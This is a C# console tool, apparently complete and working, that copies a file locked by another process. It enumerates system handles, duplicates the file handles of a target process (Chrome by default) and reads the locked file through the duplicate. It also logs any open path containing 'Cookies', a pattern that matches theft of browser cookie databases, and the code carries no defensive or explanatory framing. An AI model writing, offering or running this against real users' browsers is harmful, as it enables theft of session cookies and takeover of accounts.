using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

class CopyLockedFile {
    const int SystemExtendedHandleInformation = 64;
    const uint STATUS_INFO_LENGTH_MISMATCH = 0xC0000004;
    const uint PROCESS_DUP_HANDLE = 0x0040;
    const uint DUPLICATE_SAME_ACCESS = 0x00000002;
    const uint FILE_TYPE_DISK = 0x0001;

    [StructLayout(LayoutKind.Sequential)]
    struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
        public IntPtr Object;
        public IntPtr UniqueProcessId;
        public IntPtr HandleValue;
        public uint GrantedAccess;
        public ushort CreatorBackTraceIndex;
        public ushort ObjectTypeIndex;
        public uint HandleAttributes;
        public uint Reserved;
    }

    [DllImport("ntdll.dll")]
    static extern uint NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, out int ReturnLength);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, bool bInheritHandle, uint dwOptions);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Auto)]
    static extern uint GetFinalPathNameByHandle(IntPtr hFile, [Out] StringBuilder lpszFilePath, uint cchFilePath, uint dwFlags);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint GetFileType(IntPtr hFile);

    [DllImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool SetFilePointerEx(IntPtr hFile, long liDistanceToMove, out long lpNewFilePointer, uint dwMoveMethod);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern uint GetFileSize(IntPtr hFile, out uint lpFileSizeHigh);

    static int Main(string[] args) {
        if (args.Length < 2) {
            Console.WriteLine("Usage: CopyLockedFile <source-file> <destination-file> [processNameOrPid]");
            return 1;
        }

        string sourcePath = Path.GetFullPath(args[0]);
        string destPath = Path.GetFullPath(args[1]);
        string filter = args.Length > 2 ? args[2].Trim() : "chrome";

        Console.WriteLine("Attempting to copy locked file: " + sourcePath);
        Console.WriteLine("Target: " + destPath);

        try {
            File.Copy(sourcePath, destPath, true);
            Console.WriteLine("SUCCESS: Standard File.Copy succeeded!");
            return 0;
        } catch (Exception ex) {
            Console.WriteLine("Standard copy failed (" + ex.Message + "), trying handle duplication...");
        }

        HashSet<long> pids = new HashSet<long>();
        int parsedPid;
        if (int.TryParse(filter, out parsedPid)) {
            pids.Add(parsedPid);
            Console.WriteLine("Targeting single PID: " + parsedPid);
        } else {
            Process[] procs = Process.GetProcessesByName(filter);
            foreach (var p in procs) pids.Add((long)p.Id);
            Console.WriteLine("Found " + pids.Count + " processes named " + filter);
        }

        int length = 0x20000;
        IntPtr ptr = Marshal.AllocHGlobal(length);
        int returnLength = 0;

        while (true) {
            uint status = NtQuerySystemInformation(SystemExtendedHandleInformation, ptr, length, out returnLength);
            if (status == STATUS_INFO_LENGTH_MISMATCH) {
                Marshal.FreeHGlobal(ptr);
                length = Math.Max(length * 2, returnLength + 0x10000);
                ptr = Marshal.AllocHGlobal(length);
            } else if (status == 0) {
                break;
            } else {
                Marshal.FreeHGlobal(ptr);
                Console.WriteLine("NtQuerySystemInformation failed with status: 0x" + status.ToString("X"));
                return 1;
            }
        }

        long handleCount = Marshal.ReadIntPtr(ptr).ToInt64();
        Console.WriteLine("Total system handles: " + handleCount);

        IntPtr currentProcess = Process.GetCurrentProcess().Handle;
        bool copied = false;

        int structSize = Marshal.SizeOf(typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));
        IntPtr itemPtr = new IntPtr(ptr.ToInt64() + IntPtr.Size * 2);

        Dictionary<int, IntPtr> procHandles = new Dictionary<int, IntPtr>();

        int handlesForTargetPid = 0;
        int dupOk = 0;
        int dupErr = 0;

        for (long i = 0; i < handleCount; i++) {
            var handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX)Marshal.PtrToStructure(itemPtr, typeof(SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX));
            itemPtr = new IntPtr(itemPtr.ToInt64() + structSize);

            long pid = handleInfo.UniqueProcessId.ToInt64();
            if (!pids.Contains(pid)) continue;

            handlesForTargetPid++;

            int intPid = (int)pid;
            IntPtr procHandle;
            if (!procHandles.TryGetValue(intPid, out procHandle)) {
                procHandle = OpenProcess(PROCESS_DUP_HANDLE, false, intPid);
                int openErr = Marshal.GetLastWin32Error();
                Console.WriteLine("OpenProcess for PID " + intPid + ": " + (procHandle != IntPtr.Zero ? "OK" : "FAILED err=" + openErr));
                procHandles[intPid] = procHandle;
            }
            if (procHandle == IntPtr.Zero) continue;

            IntPtr dupHandle;
            if (DuplicateHandle(procHandle, handleInfo.HandleValue, currentProcess, out dupHandle, 0, false, DUPLICATE_SAME_ACCESS)) {
                dupOk++;
                uint fileType = GetFileType(dupHandle);
                if (fileType == 3) { // FILE_TYPE_PIPE can hang on GetFinalPathNameByHandle
                    CloseHandle(dupHandle);
                    continue;
                }

                StringBuilder sb = new StringBuilder(1024);
                uint pathLen = GetFinalPathNameByHandle(dupHandle, sb, (uint)sb.Capacity, 0);
                    if (pathLen == 0) {
                        int pathErr = Marshal.GetLastWin32Error();
                        Console.WriteLine("GetFinalPathNameByHandle failed err=" + pathErr);
                    }
                    if (pathLen > 0) {
                        string filePath = sb.ToString();
                        Console.WriteLine("Path: " + filePath);
                        if (filePath.StartsWith(@"\\?\")) filePath = filePath.Substring(4);

                        if (filePath.IndexOf("Cookies", StringComparison.OrdinalIgnoreCase) >= 0) {
                            Console.WriteLine("Found Cookie path: " + filePath);
                        }

                        if (string.Equals(filePath, sourcePath, StringComparison.OrdinalIgnoreCase)) {
                            Console.WriteLine("MATCH FOUND! Handle 0x" + handleInfo.HandleValue.ToString("X") + " in PID " + pid + ": " + filePath);

                            long newPos;
                            SetFilePointerEx(dupHandle, 0, out newPos, 0);

                            uint sizeHigh;
                            uint sizeLow = GetFileSize(dupHandle, out sizeHigh);
                            long totalSize = ((long)sizeHigh << 32) | sizeLow;
                            Console.WriteLine("File size: " + totalSize + " bytes");

                            Directory.CreateDirectory(Path.GetDirectoryName(destPath));

                            using (FileStream fs = new FileStream(destPath, FileMode.Create, FileAccess.Write, FileShare.None)) {
                                byte[] buffer = new byte[64 * 1024];
                                long remaining = totalSize;
                                while (remaining > 0) {
                                    uint toRead = (uint)Math.Min(buffer.Length, remaining);
                                    uint bytesRead;
                                    if (!ReadFile(dupHandle, buffer, toRead, out bytesRead, IntPtr.Zero) || bytesRead == 0) {
                                        break;
                                    }
                                    fs.Write(buffer, 0, (int)bytesRead);
                                    remaining -= bytesRead;
                                }
                            }

                            Console.WriteLine("SUCCESS: Duplicated handle and wrote " + new FileInfo(destPath).Length + " bytes to " + destPath);
                            copied = true;
                            CloseHandle(dupHandle);
                            break;
                        }
                    }
                CloseHandle(dupHandle);
            } else {
                dupErr++;
                if (dupErr <= 3) {
                    Console.WriteLine("DuplicateHandle err for 0x" + handleInfo.HandleValue.ToString("X") + ": " + Marshal.GetLastWin32Error());
                }
            }
        }

        Console.WriteLine("PID stats: handles=" + handlesForTargetPid + ", dupOk=" + dupOk + ", dupErr=" + dupErr);

        foreach (var kvp in procHandles) {
            if (kvp.Value != IntPtr.Zero) CloseHandle(kvp.Value);
        }

        Marshal.FreeHGlobal(ptr);

        if (!copied) {
            Console.WriteLine("FAILURE: Could not find matching open file handle in target processes.");
            return 1;
        }

        return 0;
    }
}
